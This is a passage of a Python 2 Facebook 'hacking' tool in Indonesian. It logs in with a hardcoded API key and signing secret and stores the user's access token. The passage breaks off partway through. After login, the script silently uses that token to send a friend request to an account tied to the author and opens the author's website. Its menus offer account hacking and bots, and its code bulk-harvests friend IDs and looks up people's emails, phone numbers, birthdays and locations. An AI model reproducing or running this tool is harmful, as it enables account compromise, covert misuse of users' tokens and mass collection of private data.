# hackfb.py
Hack FB SETAN
#!/usr/bin/python 
 # coding=utf-8 
 # pashakun.com 
  
 #Import module 
 import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib 
 from multiprocessing.pool import ThreadPool 
 try: 
         import mechanize 
 except ImportError: 
         os.system("pip2 install mechanize") 
 try: 
         import requests 
 except ImportError: 
         os.system("pip2 install requests") 
 from requests.exceptions import ConnectionError 
 from mechanize import Browser 
  
 #-Setting-# 
 ######## 
 reload(sys) 
 sys.setdefaultencoding('utf8') 
 br = mechanize.Browser() 
 br.set_handle_robots(False) 
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1) 
 br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')] 
  
 #-Keluar-# 
 def keluar(): 
         print "\033[1;91m[!] Exit" 
         os.sys.exit() 
          
 #-Warna-# 
 def acak(x): 
     w = 'mhkbpcP' 
     d = '' 
     for i in x: 
         d += '!'+w[random.randint(0,len(w)-1)]+i 
     return cetak(d) 
      
 def cetak(x): 
     w = 'mhkbpcP' 
     for i in w: 
         j = w.index(i) 
         x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j)) 
     x += '\033[0m' 
     x = x.replace('!0','\033[0m') 
     sys.stdout.write(x+'\n') 
          
 #-Animasi-# 
 def jalan(z): 
         for e in z + '\n': 
                 sys.stdout.write(e) 
                 sys.stdout.flush() 
                 time.sleep(00000.1) 
                  
 ##### LOGO ##### 
 logo = """\033[1;30m█████████ 
 \033[1;30m█▄█████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬● 
 \033[1;30m█\033[1;92m▼▼▼▼▼ \033[1;92m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗  
 \033[1;30m█ \033[1;92m \033[1;92m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗ 
 \033[1;30m█\033[1;92m▲▲▲▲▲\033[1;92m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;96m 
 \033[1;30m█████████      \033[1;92m«----------✧----------» 
 \033[1;30m ██ ██ 
 \033[1;31m╔════════════════════════════════════════════╗ 
 \033[1;31m║\033[1;32m* \033[1;93mAuthor  \033[1;93m: \033[1;37m./OiBoy SecLinux         \033[1;31m       ║ 
 \033[1;31m║\033[1;32m* \033[1;93mWebsite \033[1;93m: \033[1;37m\033[4mhttps://pashakun.com\033[0m \033[1;31m           ║ 
 \033[1;31m║\033[1;32m* \033[1;93mGitHub  \033[1;93m: \033[1;37m\033[4mhttps://github.com/pashayogi\033[0m \033[1;31m   ║ 
 \033[1;31m║\033[1;32m* \033[1;93mTeam    \033[1;93m: \033[1;37m\033[ADIATMA SYSTEM XMOS7\033[0m \033[1;31m   ║ 
 \033[1;31m╚════════════════════════════════════════════╝""" 
  
 # titik # 
 def tik(): 
         titik = ['.   ','..  ','... '] 
         for o in titik: 
                 print("\r\033[1;91m[●] \033[1;92mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(1) 
  
 back = 0 
 threads = [] 
 berhasil = [] 
 cekpoint = [] 
 oks = [] 
 gagal = [] 
 idteman = [] 
 idfromteman = [] 
 idmem = [] 
 emmem = [] 
 nomem = [] 
 id = [] 
 em = [] 
 emfromteman = [] 
 hp = [] 
 hpfromteman = [] 
 reaksi = [] 
 reaksigrup = [] 
 komen = [] 
 komengrup = [] 
 listgrup = [] 
 vulnot = "\033[31mNot Vuln" 
 vuln = "\033[32mVuln" 
  
 ##### LICENSE ##### 
 #=================# 
 def lisensi(): 
         os.system('reset') 
         masuk() 
  
 ##### Pilih Login ##### 
 def masuk(): 
         os.system('reset') 
         print logo 
         print "\033[1;91m║--\033[1;91m> \033[1;95m1.\033[1;32m Login dulu" 
         print "\033[1;91m║--\033[1;91m> \033[1;95m2.\033[1;32m Login using token" 
         print "\033[1;91m║--\033[1;91m> \033[1;95m0.\033[1;31m Exit/keluar" 
         print "\033[1;91m║" 
         msuk = raw_input("\033[1;96m╚═\033[1;1mD \033[1;93m") 
         if msuk =="": 
                 print"\033[1;91m[!] Wrong input" 
                 keluar() 
         elif msuk =="1": 
                 login() 
         elif msuk =="2": 
                 tokenz() 
         elif msuk =="0": 
                 keluar() 
         else: 
                 print"\033[1;91m[!] Wrong input" 
                 keluar() 
                  
 ##### LOGIN ##### 
 #================# 
 def login(): 
         os.system('reset') 
         try: 
                 toket = open('login.txt','r') 
                 menu()  
         except (KeyError,IOError): 
                 os.system('reset') 
                 print logo 
                 print('\033[1;96m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]') 
                 id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ') 
                 pwd = getpass.getpass('\033[1;95m[+] \033[1;93mPassword \033[1;93m:\033[1;95m ') 
                 tik() 
                 try: 
                         br.open('https://m.facebook.com') 
                 except mechanize.URLError: 
                         print"\n\033[1;91m[!] No connection" 
                         keluar() 
                 br._factory.is_html = True 
                 br.select_form(nr=0) 
                 br.form['email'] = id 
                 br.form['pass'] = pwd 
                 br.submit() 
                 url = br.geturl() 
                 if 'save-device' in url: 
                         try: 
                                 sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32' 
                                 data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"} 
                                 x=hashlib.new("md5") 
                                 x.update(sig) 
                                 a=x.hexdigest() 
                                 data.update({'sig':a}) 
                                 url = "https://api.facebook.com/restserver.php" 
                                 r=requests.get(url,params=data) 
                                 z=json.loads(r.text) 
                                 zedd = open("login.txt", 'w') 
                                 zedd.write(z['access_token']) 
                                 zedd.close() 
                                 print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully' 
                                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token']) 
                                 os.system('xdg-open https://www.pashakun.com') 
                                 menu() 
                         except requests.exceptions.ConnectionError: 
                                 print"\n\033[1;91m[!] No connection" 
                                 keluar() 
                 if 'checkpoint' in url: 
                         print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint") 
                         print("\n\033[1;92m[#] Harap Login Ulang !") 
                         os.system('rm -rf login.txt') 
                         time.sleep(1) 
                         keluar() 
                 else: 
                         print("\n\033[1;91m[!] Login Failed") 
                         os.system('rm -rf login.txt') 
                         time.sleep(1) 
                         login() 
                          
 ##### TOKEN ##### 
 def tokenz(): 
         os.system('reset') 
         print logo 
         toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m") 
         try: 
                 otw = requests.get('https://graph.facebook.com/me?access_token='+toket) 
                 a = json.loads(otw.text) 
                 nama = a['name'] 
                 zedd = open("login.txt", 'w') 
                 zedd.write(toket) 
                 zedd.close() 
                 menu() 
         except KeyError: 
                 print "\033[1;91m[!] Wrong" 
                 e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ") 
                 if e =="": 
                         keluar() 
                 elif e =="y": 
                         login() 
                 else: 
                         keluar() 
                          
 ##### MENU ########################################## 
 def menu(): 
         os.system('reset') 
         try: 
                 toket=open('login.txt','r').read() 
         except IOError: 
                 os.system('reset') 
                 print"\033[1;91m[!] Token not found" 
                 os.system('rm -rf login.txt') 
                 time.sleep(1) 
                 login() 
         try: 
                 otw = requests.get('https://graph.facebook.com/me?access_token='+toket) 
                 a = json.loads(otw.text) 
                 nama = a['name'] 
                 id = a['id'] 
         except KeyError: 
                 os.system('reset') 
                 print"\033[1;91m[!] \033[1;93mAccount Checkpoint" 
                 os.system('rm -rf login.txt') 
                 time.sleep(1) 
                 login() 
         except requests.exceptions.ConnectionError: 
                 print"\033[1;91m[!] No connection" 
                 keluar() 
         os.system("reset") 
         print logo 
         print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m" 
         print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m ID   \033[1;91m: \033[1;92m"+id 
         print "\033[1;97m╚"+40*"═" 
         print "\033[1;94m║--\033[1;91m> \033[1;93m1.\033[1;95m User information" 
         print "\033[1;94m║--\033[1;91m> \033[1;93m2.\033[1;95m Get Id/email/hp" 
         print "\033[1;94m║--\033[1;91m> \033[1;93m3.\033[1;95m Hack facebook account               " 
         print "\033[1;94m║--\033[1;91m> \033[1;93m4.\033[1;95m Bot       " 
         print "\033[1;94m║--\033[1;91m> \033[1;93m5.\033[1;95m Others           " 
         print "\033[1;94m║--\033[1;91m> \033[1;93m6.\033[1;95m Show token           " 
         print "\033[1;94m║--\033[1;91m> \033[1;93m7.\033[1;95m Delete trash          " 
         print "\033[1;94m║--\033[1;91m> \033[1;93m8.\033[1;95m LogOut            " 
         print "\033[1;94m║--\033[1;91m> \033[1;93m0.\033[1;95m Exit the programs          " 
         print "║" 
         pilih() 
 #- 
 def pilih(): 
         zedd = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m") 
         if zedd =="": 
                 print "\033[1;91m[!] Wrong input" 
                 pilih() 
         elif zedd =="1": 
                 informasi() 
         elif zedd =="2": 
                 dump() 
         elif zedd =="3": 
                 menu_hack() 
         elif zedd =="4": 
                 menu_bot() 
         elif zedd =="5": 
                 lain() 
         elif zedd =="6": 
                 os.system('reset') 
                 print logo 
                 toket=open('login.txt','r').read() 
                 print "\033[1;91m[+] \033[1;92mYour token\033[1;91m :\033[1;97m "+toket 
                 raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]") 
                 menu() 
         elif zedd =="7": 
                 os.remove('out') 
         elif zedd =="8": 
                 os.system('rm -rf login.txt') 
                 os.system('xdg-open https://www.pashakun.com') 
                 keluar() 
         elif zedd =="0": 
                 keluar() 
         else: 
                 print "\033[1;91m[!] Wrong input" 
                 pilih() 
          
 ##### INFO ##### 
 def informasi(): 
         os.system('reset') 
         try: 
                 toket=open('login.txt','r').read() 
         except IOError: 
                 print"\033[1;91m[!] Token not found" 
                 os.system('rm -rf login.txt') 
                 time.sleep(1) 
                 login() 
         os.system('reset') 
         print logo 
         aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m') 
         jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...') 
         r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket) 
         cok = json.loads(r.text) 
         for i in cok['data']: 
                 if aid in i['name'] or aid in i['id']: 
                         x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket) 
                         z = json.loads(x.text) 
                         print 42*"\033[1;97m═" 
                         try: 
                                 print '\033[1;91m[➹] \033[1;92mName\033[1;97m          : '+z['name'] 
                         except KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m          : \033[1;91mNot found' 
                         try: 
                                 print '\033[1;91m[➹] \033[1;92mID\033[1;97m            : '+z['id'] 
                         except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;97m            : \033[1;91mNot found' 
                         try: 
                                 print '\033[1;91m[➹] \033[1;92mEmail\033[1;97m         : '+z['email'] 
                         except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;97m         : \033[1;91mNot found' 
                         try: 
                                 print '\033[1;91m[➹] \033[1;92mTelephone\033[1;97m     : '+z['mobile_phone'] 
                         except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mNot found' 
                         try: 
                                 print '\033[1;91m[➹] \033[1;92mLocation\033[1;97m      : '+z['location']['name'] 
                         except KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;97m      : \033[1;91mNot found' 
                         try: 
                                 print '\033[1;91m[➹] \033[1;92mDate of birth\033[1;97m : '+z['birthday'] 
                         except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mNot found' 
                         try: 
                                 print '\033[1;91m[➹] \033[1;92mSchool\033[1;97m        : ' 
                                 for q in z['education']: 
                                         try: 
                                                 print '\033[1;91m                   ~ \033[1;97m'+q['school']['name'] 
                                         except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found' 
                         except KeyError: pass 
                         raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]") 
                         menu() 
                 else: 
                         pass 
         else: 
                 print"\033[1;91m[✖] User not found" 
                 raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]") 
                 menu() 
                  
 ##### DUMP ##### 
 def dump(): 
         os.system('reset') 
         try: 
                 toket=open('login.txt','r').read() 
         except IOError: 
                 print"\033[1;91m[!] Token not found" 
                 os.system('rm -rf login.txt') 
                 time.sleep(1) 
                 login() 
         os.system('reset') 
         print logo 
         print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Get ID friend" 
         print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Get ID friend from friend" 
         print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Get ID Search" 
         print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Get group member ID" 
         print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Get group member email" 
         print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Get group member phone number" 
         print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Get email friend" 
         print "\033[1;97m║--\033[1;91m> \033[1;92m8.\033[1;97m Get email friend from friend" 
         print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m Get a friend's phone number" 
         print "\033[1;97m║--\033[1;91m> \033[1;92m10.\033[1;97m Get a friend's phone number from friend" 
         print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back" 
         print "║" 
         dump_pilih() 
 #-----pilih 
 def dump_pilih(): 
         cuih = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m") 
         if cuih =="": 
                 print "\033[1;91m[!] Wrong input" 
                 dump_pilih() 
         elif cuih =="1": 
                 id_teman() 
         elif cuih =="2": 
                 idfrom_teman() 
         elif cuih =="3": 
                 os.system('reset') 
                 print "\033[1;91mSegera" 
                 keluar() 
         elif cuih =="4": 
                 id_member_grup() 
         elif cuih =="5": 
                 em_member_grup() 
         elif cuih =="6": 
                 no_member_grup() 
         elif cuih =="7": 
                 email() 
         elif cuih =="8": 
                 emailfrom_teman() 
         elif cuih =="9": 
                 nomor_hp() 
         elif cuih =="10": 
                 hpfrom_teman() 
         elif cuih =="0": 
                 menu() 
         else: 
                 print "\033[1;91m[!] Wrong input" 
                 dump_pilih() 
                  
 ##### ID TEMAN ##### 
 def id_teman(): 
         os.system('reset') 
         try: 
                 toket=open('login.txt','r').read() 
         except IOError: 
                 print"\033[1;91m[!] Token not found" 
                 os.system('rm -rf login.txt') 
                 time.sleep(1) 
                 login() 
         try: 
                 os.mkdir('out') 
         except OSError: 
                 pass 
         try: 
                 os.system('reset') 
                 print logo 
                 r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket) 
                 z=json.loads(r.text) 
                 jalan('\033[1;91m[✺] \033[1;92mGet all friend id \033[1;97m...') 
                 print 42*"\033[1;97m═" 
                 bz = open('out/id_teman.txt','w') 
                 for a in z['data']: 
                         idteman.append(a['id']) 
                         bz.write(a['id'] + '\n') 
                         print ("\r\033[1;97m[ \033[1;92m"+str(len(idteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001) 
                 bz.close() 
                 print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....' 
                 print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idteman)) 
                 done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ") 
                 os.rename('out/id_teman.txt','out/'+done) 
                 print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done) 
                 raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]") 
                 dump() 
         except IOError: 
                 print"\033[1;91m[!] Error creating file" 
                 raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]") 
                 dump() 
         except (KeyboardInterrupt,EOFError): 
                 print("\033[1;91m[!] Stopped") 
                 raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]") 
                 dump() 
         except KeyError: 
                 print('\033[1;91m[!] Error') 
                 raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]") 
                 dump() 
         except requests.exceptions.ConnectionError: 
                 print"\033[1;91m[✖] No connection" 
                 keluar() 
  
 ##### ID FROM TEMAN ##### 
 def idfrom_teman(): 
         os.system('reset') 
         try: 
                 toket=open('login.txt','r').read() 
         except IOError: 
          
